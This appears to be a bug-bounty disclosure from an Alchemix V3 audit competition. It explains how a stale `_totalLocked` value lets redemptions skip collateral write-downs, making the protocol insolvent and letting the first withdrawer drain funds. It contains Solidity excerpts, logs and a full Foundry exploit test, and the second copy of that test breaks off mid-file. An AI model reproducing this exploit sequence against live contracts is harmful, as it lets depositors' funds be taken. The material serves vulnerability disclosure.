# 58530 sc high protocol insolvency via stale totallocked zeroed totallocked prevents collateralweight update in redeem leading to missed collateral haircut

**Submitted on Nov 3rd 2025 at 03:18:16 UTC by @x0xmechanic for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58530
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

When MYT price changes, `_totalLocked` does not track the true aggregate of users’ `rawLocked` (which depends on price). This desynchronization allows a later `burn` to free more collateral than `_totalLocked` thinks exists; the code clamps and sets `toFree = _totalLocked`, pushing `_totalLocked` to zero. With `_totalLocked == 0`, `redeem()` applies **zero collateral weight increment**, so no user collateral is written down while MYT is transferred out to the transmuter. The system becomes **insolvent** and produces a race: first fully-repaid user can withdraw in full; later users cannot.

## Vulnerability Details

The drift between `_totalLocked` and the sum of users’ `rawLocked` starts in `_addDebt` where the account's `rawLocked` is **fully re-calculated** to the *current* MYT price, but the global `_totalLocked` is **not**:

```solidity
function _addDebt(uint256 tokenId, uint256 amount) internal {
        Account storage account = _accounts[tokenId];

        // Update collateral variables
        uint256 toLock = convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
        uint256 lockedCollateral = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;

        if (account.collateralBalance - lockedCollateral < toLock) revert Undercollateralized();

        account.rawLocked = lockedCollateral + toLock; // reindexed to *current* price
        _totalLocked += toLock;                        // only adds the *increment*
        account.debt += amount;
        totalDebt += amount;
    }
```

When MYT price moves between mints, `convertDebtTokensToYield(account.debt)` changes, so the account’s `rawLocked` jumps by the reindex delta `Δ_i = lockedCollateral_new − lockedCollateral_prev`. The code **overwrites** `account.rawLocked` to the new amount but `_totalLocked` is only increased by `toLock` (for the *new* debt) and **does not correct** for the old debt. Summing across users, the sum of `rawLocked` includes all these reindex deltas, while `_totalLocked` misses them; the gap accumulates and `_totalLocked` becomes different than the sum of the users' `rawLocked`.

Because of this drift, `_totalLocked` can fall below a single user’s `rawLocked`. Then, when that user calls `burn`, `_subDebt` computes `toFree` but clamps it to `_totalLocked` (**we show all of this in the PoC**):

```solidity
    function _subDebt(uint256 tokenId, uint256 amount) internal {
        Account storage account = _accounts[tokenId];

        // Update collateral variables
        uint256 toFree = convertDebtTokensToYield(amount) * minimumCollateralization / FIXED_POINT_SCALAR;
        uint256 lockedCollateral = convertDebtTokensToYield(account.debt) * minimumCollateralization / FIXED_POINT_SCALAR;

        // For cases when someone above minimum LTV gets liquidated.
        if (toFree > _totalLocked) {
            toFree = _totalLocked;   // <— clamp
        }

        account.debt -= amount;
        totalDebt -= amount;
        _totalLocked -= toFree; // <— can push to zero
        account.rawLocked = lockedCollateral - toFree;

        // Clamp to avoid underflow due to rounding later at a later time
        if (cumulativeEarmarked > totalDebt) {
            cumulativeEarmarked = totalDebt;
        }
    }
```

Because `_totalLocked` is **too small** (stale), a normal burn for a healthy account can have `toFree > _totalLocked`. The clamp sets `toFree = _totalLocked`, and then `_totalLocked -= toFree` makes `_totalLocked == 0`. This is not expressing “no more lock exists globally”; it’s an artifact of drift.

Then, when a redemption happens, `redeem` misses the collateral haircut when `_totalLocked == 0` because `redeem()` computes the increment to `_collateralWeight` relative to `old = _totalLocked`:

```solidity
// update locked collateral + collateral weight
uint256 old = _totalLocked;
_totalLocked = totalOut > old ? 0 : old - totalOut;
_collateralWeight += PositionDecay.WeightIncrement(totalOut > old ? old : totalOut, old);

TokenUtils.safeTransfer(myt, transmuter, collRedeemed);
TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);
_mytSharesDeposited -= collRedeemed + feeCollateral;
```

If `old == 0`, then `WeightIncrement` contributes **zero**. The redemption **sends MYT out**:

```solidity
TokenUtils.safeTransfer(myt, transmuter, collRedeemed);
TokenUtils.safeTransfer(myt, protocolFeeReceiver, feeCollateral);
```

but **does not** increase `_collateralWeight`. Consequently, `_sync()` applies **no collateral removal**:

```solidity
// Collateral to remove from redemptions and fees
uint256 collateralToRemove = PositionDecay.ScaleByWeightDelta(account.rawLocked, _collateralWeight - account.lastCollateralWeight);
account.collateralBalance -= collateralToRemove;  // ← becomes zero removal if weight didn’t move
```

Therefore, per-user `collateralBalance` stays overstated (book), while contract's MYT decreased.

Withdraw enforces only the caller’s lock, not overall contract solvency, because `withdraw()` checks the user’s own lock before transferring MYT. There’s no guard that **sum collateralBalance ≤ contract MYT**. After a missed haircut, the **first fully-repaid** user can withdraw their full (stale) `collateralBalance`; later users’ attempts revert with ERC20 underflow.

### PoC Walkthrough:

1. Two users (beef and user1) deposit and mint; the Alchemist holds **\~200k MYT** total, each user’s `collateralBalance` is **\~100k**.
2. The MYT price changes via a supply increase.
3. Users mint again at the new price.
4. Because `_addDebt` only adds `toLock` for the delta and never reindexes past debt, `_totalLocked` **drifts below** the true sum of `rawLocked`.
5. A subsequent burn by beef clamps in `_subDebt` (`toFree = min(toFree, _totalLocked)`), which **drives `_totalLocked → 0`** due to the drift.
6. A **redemption executes** with `old == 0`, so **no `_collateralWeight` update** occurs; MYT exits the contract but per-user books remain unchanged: contract MYT ≈ **198k**, users still show **100k + 100k**.
7. **Beef** (after `repay` and debt=0) withdraws **100k** → succeeds; contract MYT drops to **\~98k**.
8. **User1** (after `repay` and debt=0) then tries to withdraw **100k** → **reverts** (`panic 0x11`) since only **\~98k** remain in the contract.

## Impact Details

Impact category: **Critical - Protocol insolvency.** Any redemption executed after `_totalLocked` has been artificially zeroed will **transfer MYT out** without writing down users’ `collateralBalance`. The resulting shortfall is at least the redemption amount + fee for that event, and can **compound** across events.

**First-withdrawer advantage:** A repaid user can extract their full book amount. **Later users’ withdrawals revert**, even with zero debt.

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

We provided the PoC walk-through in the Description section.

We use exactly the same setup as in the `contract AlchemistV3Test`.

The logs are:

```solidity
Logs:
  raw locked beef after price move: 78888888888888888890859
  raw locked user1 after price move: 11833333333333333333628
  sum of raw locked after price move: 90722222222222222224487
  collateral beef after Burn: 100000000000000000000000
  debt beef after Burn: 4000000000000000000000
  collateral user1 after Burn: 100000000000000000000000
  debt user1 after Burn: 6000000000000000000000
  Alchemist MYT shares: 200000000000000000000000
  Alchemist MYT shares after redemption: 198224999999999999999779
  collateral beef after redemption: 100000000000000000000000
  debt beef after redemption: 3600000000000000000000
  collateral user1 after redemption: 100000000000000000000000
  debt user1 after redemption: 5400000000000000000000
  collateral beef after repay: 100000000000000000000000
  debt beef after repay: 0
  Alchemist MYT shares after beef withdraws all of his collateral: 98224999999999999999779
  collateral user1 after repay: 100000000000000000000000
  debt user1 after repay: 0
```

The test is:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract PrivateTotalLockedTest is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e18;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    address public user1 = address(0x1111);

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public protocolFeeReceiver = address(10);

    // MYT variables
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;
    address public operator = address(0x2222222222222222222222222222222222222222); // default operator
    address public admin = address(0x4444444444444444444444444444444444444444); // DAO OSX
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 2_000_000_000e18;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%

    struct CalculateLiquidationResult {
        uint256 liquidationAmountInYield;
        uint256 debtToBurn;
        uint256 outSourcedFee;
        uint256 baseFeeInYield;
    }

    struct AccountPosition {
        address user;
        uint256 collateral;
        uint256 debt;
        uint256 tokenId;
    }

    function setUp() external {
        adJustTestFunds(18);
        setUpMYT(18);
        deployCoreContracts(18);
    }

    function adJustTestFunds(uint256 alchemistUnderlyingTokenDecimals) public {
        accountFunds = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
        whaleSupply = 20_000_000_000 * 10 ** alchemistUnderlyingTokenDecimals;
        depositAmount = 200_000 * 10 ** alchemistUnderlyingTokenDecimals;
    }

    function setUpMYT(uint256 alchemistUnderlyingTokenDecimals) public {
        vm.startPrank(admin);
        uint256 TOKEN_AMOUNT = 1_000_000; // Base token amount
        uint256 initialSupply = TOKEN_AMOUNT * 10 ** alchemistUnderlyingTokenDecimals;
        mockVaultCollateral = address(new TestERC20(initialSupply, uint8(alchemistUnderlyingTokenDecimals)));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function _magicDepositToVault(address vault, address depositor, uint256 amount) internal returns (uint256) {
        deal(address(mockVaultCollateral), address(depositor), amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(address(mockVaultCollateral), vault, amount);
        uint256 shares = IVaultV2(vault).deposit(amount, depositor);
        vm.stopPrank();
        return shares;
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 selector = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(selector));
    }

    function deployCoreContracts(uint256 alchemistUnderlyingTokenDecimals) public {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(vault.asset()),
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: protocolFeeReceiver,
            liquidatorFee: liquidatorFeeBPS,
            repaymentFee: 100,
            myt: address(vault)
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(address(user1));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(vault.asset()), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));

        _magicDepositToVault(address(vault), address(0xbeef), accountFunds);
        _magicDepositToVault(address(vault), user1, accountFunds);
        _magicDepositToVault(address(vault), address(0xdad), accountFunds);
        _magicDepositToVault(address(vault), externalUser, accountFunds);
        _magicDepositToVault(address(vault), yetAnotherExternalUser, accountFunds);
        _magicDepositToVault(address(vault), anotherExternalUser, accountFunds);
        vm.stopPrank();

        vm.startPrank(address(admin));
        allocator.allocate(address(mytStrategy), vault.convertToAssets(vault.totalSupply()));
        vm.stopPrank();

        deal(address(alToken), address(0xdad), accountFunds);
        deal(address(alToken), address(anotherExternalUser), accountFunds);
        deal(address(vault.asset()), address(0xbeef), accountFunds);
        deal(address(vault.asset()), user1, accountFunds);
        deal(address(vault.asset()), externalUser, accountFunds);
        deal(address(vault.asset()), yetAnotherExternalUser, accountFunds);
        deal(address(vault.asset()), anotherExternalUser, accountFunds);
        deal(address(vault.asset()), alchemist.alchemistFeeVault(), 10_000 * (10 ** alchemistUnderlyingTokenDecimals));

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault.asset()), address(vault), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(vault), someWhale, whaleSupply);
        deal(address(vault.asset()), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(vault.asset()), address(mockStrategyYieldToken), whaleSupply);
        vm.stopPrank();
    }

    function testPrivateTotalLocked() external {
        //beef deposits and mints
        uint256 amount = accountFunds/2;
        uint256 ltv_beef = 2e17;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);

        // a single position nft would have been minted to address(0xbeef)
        uint256 tokenId_beef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId_beef, (amount * ltv_beef) / FIXED_POINT_SCALAR, address(0xbeef));
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(address(0xbeef)), (amount * ltv_beef) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        //user1 deposits and mints
        uint256 ltv_user1 = 3e16;
        vm.startPrank(user1);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, user1, 0);

        // a single position nft would have been minted to user1
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(user1, address(alchemistNFT));
        alchemist.mint(tokenId1, (amount * ltv_user1) / FIXED_POINT_SCALAR, user1);
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(user1), (amount * ltv_user1) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = (initialVaultSupply * 7750 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // beef and user1 mint again based on the new price
        vm.startPrank(address(0xbeef));
        alchemist.mint(tokenId_beef, (amount * ltv_beef) / FIXED_POINT_SCALAR, address(0xbeef));
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(address(0xbeef)), (2* amount * ltv_beef) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        vm.startPrank(user1);
        alchemist.mint(tokenId1, (amount * ltv_user1) / FIXED_POINT_SCALAR, user1);
        vm.assertApproxEqAbs(IERC20(alToken).balanceOf(user1), (2* amount * ltv_user1) / FIXED_POINT_SCALAR, minimumDepositOrWithdrawalLoss);
        vm.stopPrank();

        (, uint256 userDebt_beef,) = alchemist.getCDP(tokenId_beef);
        uint256 rawlocked_beef = 
            alchemist.convertDebtTokensToYield(userDebt_beef) * minimumCollateralization / FIXED_POINT_SCALAR;
        console.log("raw locked beef after price move:", rawlocked_beef);    

        (, uint256 userDebt_user1,) = alchemist.getCDP(tokenId1);
        uint256 rawlocked_user1 = 
            alchemist.convertDebtTokensToYield(userDebt_user1) * minimumCollateralization / FIXED_POINT_SCALAR;
        console.log("raw locked user1 after price move:", rawlocked_user1);  

        uint256 sumRawLocked = rawlocked_beef + rawlocked_user1;
        console.log("sum of raw locked after price move:", sumRawLocked);

        vm.roll(block.number + 1);

        //beef burns some amount
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(alToken), address(alchemist), userDebt_beef);
        alchemist.burn(9 * userDebt_beef / 10, tokenId_beef);
        vm.stopPrank();

        alchemist.poke(tokenId_beef);
        alchemist.poke(tokenId1);

        (uint256 collateral_beef_afterBurn, uint256 userDebt_beef_afterBurn,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after Burn:", collateral_beef_afterBurn);   
        console.log("debt beef after Burn:", userDebt_beef_afterBurn);

        (uint256 collateral_user1_afterBurn, uint256 userDebt_user1_afterBurn,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after Burn:", collateral_user1_afterBurn);   
        console.log("debt user1 after Burn:", userDebt_user1_afterBurn);

        console.log("Alchemist MYT shares:", IERC20(address(vault)).balanceOf(address(alchemist)));
        //the alchemist holds the sum of beef and user1 collateral
        assertEq(IERC20(address(vault)).balanceOf(address(alchemist)), collateral_beef_afterBurn + collateral_user1_afterBurn);

        //dad creates and claims redemption, but becase _totalLocked is zero, 
        //_collateralWeight does not get updated
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 1000e18);
        transmuterLogic.createRedemption(1000e18);
        vm.stopPrank();

        vm.roll(block.number + 5_256_000);

        vm.startPrank(address(0xdad));
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();

        //the alchemist holds less shares after redemption
        //but the beef and user1 collaterals did not get updated
        console.log("Alchemist MYT shares after redemption:", IERC20(address(vault)).balanceOf(address(alchemist)));

        alchemist.poke(tokenId_beef);
        alchemist.poke(tokenId1);

        (uint256 collateral_beef_afterRedemption, uint256 userDebt_beef_afterRedemption,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after redemption:", collateral_beef_afterRedemption);   
        console.log("debt beef after redemption:", userDebt_beef_afterRedemption);
        assertEq(collateral_beef_afterBurn, collateral_beef_afterRedemption);

        (uint256 collateral_user1_afterRedemption, uint256 userDebt_user1_afterRedemption,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after redemption:", collateral_user1_afterRedemption);   
        console.log("debt user1 after redemption:", userDebt_user1_afterRedemption);
        assertEq(collateral_user1_afterBurn, collateral_user1_afterRedemption);

        //beef repays and withdraws all of his collateral
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.repay(amount, tokenId_beef);
        vm.stopPrank();

        alchemist.poke(tokenId_beef);
        (uint256 collateral_beef_afterRepay, uint256 userDebt_beef_afterRepay,) = alchemist.getCDP(tokenId_beef);
        console.log("collateral beef after repay:", collateral_beef_afterRepay);   
        console.log("debt beef after repay:", userDebt_beef_afterRepay);

        uint256 beefBalanceBeforeWithdraw = IERC20(address(vault)).balanceOf(address(0xbeef));

        vm.startPrank(address(0xbeef));
        alchemist.withdraw(collateral_beef_afterRepay, address(0xbeef), tokenId_beef);
        vm.stopPrank();

        alchemist.poke(tokenId_beef);

        uint256 beefBalanceAfterWithdraw = IERC20(address(vault)).balanceOf(address(0xbeef));
        assertEq(beefBalanceAfterWithdraw - beefBalanceBeforeWithdraw, collateral_beef_afterRepay);

        //the alchemist becomes insolvent
        console.log("Alchemist MYT shares after beef withdraws all of his collateral:", IERC20(address(vault)).balanceOf(address(alchemist)));
        
        alchemist.poke(tokenId1);

        //user1 repays all of her debt
        vm.startPrank(user1);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.repay(amount, tokenId1);
        vm.stopPrank();

        alchemist.poke(tokenId1);
        (uint256 collateral_user1_afterRepay, uint256 userDebt_user1_afterRepay,) = alchemist.getCDP(tokenId1);
        console.log("collateral user1 after repay:", collateral_user1_afterRepay);   
        console.log("debt user1 after repay:", userDebt_user1_afterRepay);

        //user1 tries to withdraw all of her collateral but the alchemist doesn't have enough funds
        vm.startPrank(user1);
        vm.expectRevert(); // expect ERC20CallFailed / panic(0x11)
        alchemist.withdraw(collateral_user1_afterRepay, user1, tokenId1);
        vm.stopPrank();
    } 
}
```

**Note:** We also made `_totalLocked` public in `AlchemistV3` so that we can read it in the test.

The logs with public `_totalLocked` are:

```solidity
Logs:
  raw locked beef after price move: 78888888888888888890859
  raw locked user1 after price move: 11833333333333333333628
  sum of raw locked after price move: 90722222222222222224487
  _totalLocked after price move: 70916666666666666665242
  _totalLocked after beef burns part of the debt: 0
  collateral beef after Burn: 100000000000000000000000
  debt beef after Burn: 4000000000000000000000
  collateral user1 after Burn: 100000000000000000000000
  debt user1 after Burn: 6000000000000000000000
  Alchemist MYT shares: 200000000000000000000000
  Alchemist MYT shares after redemption: 198224999999999999999779
  collateral beef after redemption: 100000000000000000000000
  debt beef after redemption: 3600000000000000000000
  collateral user1 after redemption: 100000000000000000000000
  debt user1 after redemption: 5400000000000000000000
  collateral beef after repay: 100000000000000000000000
  debt beef after repay: 0
  Alchemist MYT shares after beef withdraws all of his collateral: 98224999999999999999779
  collateral user1 after repay: 100000000000000000000000
  debt user1 after repay: 0
```

The test with public `_totalLocked` is:

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {MockAlchemistAllocator} from "./mocks/MockAlchemistAllocator.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";

contract TotalLockedTest is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public constant BPS = 10_000;

    uint256 public protocolFee = 100;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds;

    // large amount to test with
    uint256 whaleSupply;

    // amount of yield/underlying token to deposit
    uint256 depositAmount;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e18;

